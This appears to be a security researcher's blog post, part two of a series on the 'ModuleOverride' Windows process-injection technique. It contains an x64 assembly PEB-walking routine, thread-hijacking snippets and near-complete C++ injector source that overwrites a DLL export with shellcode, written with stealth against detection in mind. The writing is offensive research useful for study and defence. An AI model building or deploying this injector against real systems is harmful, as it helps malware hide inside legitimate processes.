---
layout: post
title: "ModuleOverride - Part 2"
categories: injection technique
author:
- zer0Phat
---
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@zer0phat" />
<meta name="twitter:title" content="ModuleOverride Part 2" />
<meta name="twitter:image" content="https://zer0phat.github.io/postimgs/484117e9-d503-4967-b757-2f133d7c2c3a.png" />

<img href="/postimgs/484117e9-d503-4967-b757-2f133d7c2c3a.png" src="/postimgs/484117e9-d503-4967-b757-2f133d7c2c3a.png" width=350 align="right" />

Welcome back! This is the continuation of [my blog](https://zer0phat.github.io/injection/technique/2024/11/16/ModueOverride.html) on the ModuleOverride injection technique. In the first part I focused a lot on the theory concepts of ModuleOverride, talking about why and where I looked for an existing buffer inside a running process and how to retrive an handle to that memory region by parsing the PE. Let's continue where we left off!


In that first blog, I identified a potential buffer in the exported functions' memory space of any of the DLLs loaded by our target process. A pointer to such DLL was retrieved by calling ```CreateToolhelp32Snapshot``` and requesting a snapshot of the loaded modules.


In my opinion this is not the most optimised and clever method to adopt. I'm gonna show you something more basic, low-level and fun.


In the blog published by [@5hid](https://5hidobu.github.io/2024-12-03-PEBby_Injector/), he correctly identified what I'm about to introduce: a technique named PEB Walking. 
If you've already read his blog, you are going to find a bit of redundacy in the concepts touched within the next paragraphs, but I suggest you to read it anyway, as I may cover offensive aspects of the PEB and the way I walk through it that are often took into consideration by attacker and that can be an inspiration for other applications.

## PEB Walking
The process environment block (PEB) is a Windows process structure that contains information about the PE and its loaded modules (DLLs). By walking through the PEB we, or a malware, are able to get relevant information such as the relocation of the DLLs in memory.
```CreateToolhelp32Snapshot``` does nothing more than reading the desired values out of the process memory after having obtained the pointers to such regions from the PEB. A common malware technique is called PEB walk, which involves low-level inspection of the PEB structure.
Low-level means assembly to me and this was very fun as I did not know how to concatenate any ASM instructions in a meaningful way before this blog.
The Snapshot method gave us an handle to the loaded DLL we asked for. Via the PEB walking we must obtain the same data.
Before we proceed, it's mandatory to understand how the PEB is structured and where we can find the information we look for.

``` cpp
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

The PEB of a target process/PE can be found at ```GS:[60h]``` for x64 process (```FS:[30h]``` for x86 processes). <i>I'm not gonna say it anymore, but any offset I will mention from now onwards refers to the x64 architecture</i>.
```LDR``` is a pointer to ```PEB_LDR_DATA``` and it is located as a offset of ```0x18``` bytes. PEB_LDR_DATA is another data structure that contains, apart of the other relevant bits, information about the order of the loaded modules (aka the loaded DLLs).

``` cpp
typedef struct _PEB_LDR_DATA {
  ULONG                   Length;
  BOOLEAN                 Initialized;
  PVOID                   SsHandle;
  LIST_ENTRY              InLoadOrderModuleList;
  LIST_ENTRY              InMemoryOrderModuleList;
  LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

```InLoadOrderModuleList```, offset ```0x10```, points to the list of the loaded modules in the form of an array of ```LIST_ENTRY```. Each list entrie points to the next and previous ones in the array, in addition to the current dll. The address of each ```LIST_ENTRY```, if casted to ```_LDR_DATA_TABLE_ENTRY``` can provide all the information of current module.

``` cpp
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

For example:
- ```BaseDllNAme``` tells us the name of the DLLs represented by the considered ```LIST_ENTRY```;
- ```DllBase``` tells us its base address. Which the info we look for.

The idea for our assembly code is pretty simple:
- Retrieve the PEB address (```GS:[60h]```);
- Retrieve the LDR address (offset ```0x18```);
- Point to the ```InLoadOrderModuleList``` (offset ```0x10```);
- Iterate through the list entries until we find the desired module by comparing the ```BaseDllName``` (offset ```0x58```);
- Once the target DLL is found, return its ```DllBase``` address (0ffset ```0x30```);

``` asm
.data
    dllName db 'KERNELBASE.dll', 0

.code
getLib proc
    xor rax, rax
    xor rcx, rcx
    mov rax, GS:[60h]     /*PEB address*/
    mov rax, [rax + 18h]  /*LDR address*/
    add rax, 10h	  /*Point to InLoadOrderModuleList*/
l1:
    call nextMod          /*Iterate through the modules*/
    mov rax, rsi
    add rsi, 58h
    add rsi, 8h
    mov rsi, [rsi]
    lea rdi, dllName

    l2:			  /*Dll name check*/
        mov bl, [rdi]
        mov cl, [rsi]

        test bl, bl
        jz exit

        cmp bl, cl
        jne l1

        inc rdi
        add rsi, 2
        jmp l2

exit:
    add rax, 30h
    mov rax, [rax]      /*Get  Dll base address*/
    ret			/*return*/
getLib endp

nextMod proc
    xor rsi, rsi
    mov rsi, [rax]
    ret
nextMod endp

end
```

## Override Process Memory
This step in quite simple. If you've already read the Process No-Hollowing blog post, you're already aware about ```WriteProcessMemory``` and its superpowers.

For anyone who does not know what I'm talking about <i>- shame of you - </i> ```WriteProcessMemory``` is a function call in ```memoryapy.h```, which, despite its name, does more than writing bytes in the memory of a process.

``` cpp
BOOL WriteProcessMemory(HANDLE hProc, LPVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SITE_T *lpNumberOfBytesWritten);
```

Where:
- ```hProc``` is the handle to the target process;
- ```lpBaseAddress``` points to the beginning of the memory to be written;
- ```lpBuffer``` points to the data to written in the process memory;
- ```nSize``` represent the size of the buffer;
- ```lpNumberOfBytesWritten``` is the output varible which contains the counter of the written bytes;

When you invoke ```WriteProcessMemory```, it verifies the protection of the memory space in ```hProc``` between the addresses ```lpBaseAddress``` and ```lpBaseAddress + nSize```. If such protection already allows to <i>write</i>, it proceed to write ```lpBuffer``` in the checked memory space within ```hProc```. If its protection level doesn't allow it to be written, ```WriteProcessMemory``` checks if we have enough privileges to change the protection values, then it proceed adding the ```write``` permission to this memory section.
The next step is to write ```lpBuffer``` at ```lpBaseAddress``` and change the memory protection back to its original value.
We could have invoked the same modifications to the protection level, but this behaviour of ```WriteProcessMemory``` let us to save a few lines of code and help being stealthier when the ```lpBuffer``` points to a malicious shellcode.

## Trigger Shellcode Execution
We know how to write the shellcode in memory, avoiding creation of any new memory page, and we have different ways to execute it. In this blog I want to propose two approacches: a local trigger, which  writes and runs the shellcode within the DLL injected process, and a remote trigger, which writes and runs the shellcode in a third process of our choice. 
```SPOILER: The local execution is the approach I prefer as it sounds stealthier and more "natural".```

### Local Execution
To trigger the shellcode execution locally, within the injected process, it's nothing more than create a new thread.
``` cpp
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)targetAddr, NULL, 0, 0);
```
The new thread takes the over written function's address as the ```LPTHREAD_START_ROUTINE```, which, accordingly to MS documentation, is <i>the pointer to a function that notifies the host that a thread has started to execute</i>.

Creating thread is the most basic kind of process injection technique, however this seems the most logical approach as it looks like a process that spawns a thread to carry out some <i>not-well-defined</i> tasks.

### Remote Execution
There are some cases where you relly want to target a process different than the one you injected your DLL. For example, when you load the DLL in a uinique process which should not be interrupted to keep you system stable.
For such circustamces, I had to select an injection technique to be used. There could be many, but I wanted to be loyal to the idea of ```not to spawn any new process``` and I went for the ```Thread Hijacking``` technique.
This is pretty simple by clever, even if it requires modifications to the ```LibraryOverride``` workflow as you target a different process and you will override the DLL memory space of such target.
First I can't use the assembly, low-level, method to find the DLL's image base address, ```CreateToolhelp32Snapshot``` seems very helpful here.
Once the image base is retrieved and used to get an address for a targettable exported function, the remote injection process can start:
1. Open an handle to the target process with the minimum permissions required, ```PROCESS_VM_WRITE | PROCESS_VM_OPERATION```;
2. Call ```WriteProcessMemory``` to write the shellcode at the previously found address;
3. Use ```CreateToolhelp32Snapshot``` with ```TH32CS_SNAPTHREAD``` to obtain the snapshot of the target process' threads;
4. Choose one of the running threads and open an handle to it, with ```THREAD_ALL_ACCESS``` permissions;
5. Proceed hijacking this thread and modifying its execution with the following code snippet:
``` cpp
SuspendThread(hThread);                /*Supend the thread*/
GetThreadContext(hThread, &context);   
context.Rip = (DWORD_PTR)targetAddr;   /*Change RIP to point to the shellcode address*/
SetThreadContext(hThread, &context);   /*Set the new context for the thread*/
ResumeThread(hThread);                 /*Resume the thread*/
return STATUS_SUCCESS;
```

## PoC - Local Execution
In this quick PoC video I'm using Cheat Engine to inject my DLL in a ```notepad.exe``` process. The shellcode we injected spawns ```calc.exe``` and it's hardcoded in the DLL. As it was previously said, making an undetectable injector was not the main goal for this project.

<img align="center" href="/postimgs/89e02985-5e85-4bde-b447-9cbedc8e19fa.gif" src="/postimgs/89e02985-5e85-4bde-b447-9cbedc8e19fa.gif">

## What to Improve
As you can see from the proof-of-concept, the target process (```notepad.exe```) dies after the DLL injection (and shellcode execution). Having more control on what happens over the entire process is the next goal for this project.
Reducing the amount of C++, in favor of assembly is another cool change which can make ModuleOverride more streamlined. Having said that, I am satisfied with the result obtained and I hope you enjoyed it too. In the next paragraph, you can see the source of the functions executed by the DLL when loaded within the target process. The complete source code che be found in [my repo](https://github.com/zer0phat/ModuleOverride). <i>Let's go checking how different the source is compared with the what 5hid - partially - reversed.</i>

## Source
``` cpp
NTSTATUS execute(void) {
	// Arguments - Variable
	const WCHAR* pDllname = L"KERNELBASE.dll";
	unsigned char shellcode[] = "put-your-shellcode-bytes-here";

	PVOID dllBase = getLib(); /*ASM function*/

	// find the first exported function
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)dllBase;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBase + pIDH->e_lfanew);
	DWORD iedAddr = pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	
	if (iedAddr) {
		PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + iedAddr);
		
		LPDWORD addresses = (LPDWORD)((DWORD_PTR)dllBase + pIED->AddressOfFunctions);
		LPWORD ordinals = (LPWORD)((DWORD_PTR)dllBase + pIED->AddressOfNameOrdinals);

		// Select the first entry
		LPVOID targetAddr = (LPVOID)((DWORD_PTR)dllBase + addresses[ordinals[0]]);

		HANDLE hProc = GetCurrentProcess();
		SIZE_T pBytes;

    // Writing shellcode to the target address (target function overwrite)
		if (WriteProcessMemory(hProc, targetAddr, shellcode, sizeof(shellcode), &pBytes)) {
			// Trigger the shellcode 
			if (!CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)targetAddr, NULL, 0, 0)) {
				return 1;
			}
			else 
				return STATUS_SUCCESS;
		}
	}

	return 1;
}
```
